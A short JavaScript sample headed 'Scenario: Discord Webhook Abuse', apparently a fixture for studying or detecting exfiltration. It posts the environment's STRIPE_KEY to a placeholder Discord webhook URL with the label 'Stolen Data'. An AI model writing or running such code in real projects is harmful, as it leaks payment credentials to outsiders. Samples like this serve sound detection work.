// Scenario: Discord Webhook Abuse
// Stealing data to a Discord channel
import https from 'https';

function sendToDiscord(data) {
  const payload = JSON.stringify({ content: `Stolen Data: ${data}` });
  const req = https.request('https://discord.com/api/webhooks/12345678/ABCDEFG', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
  });
  req.write(payload);
  req.end();
}

sendToDiscord(process.env.STRIPE_KEY);
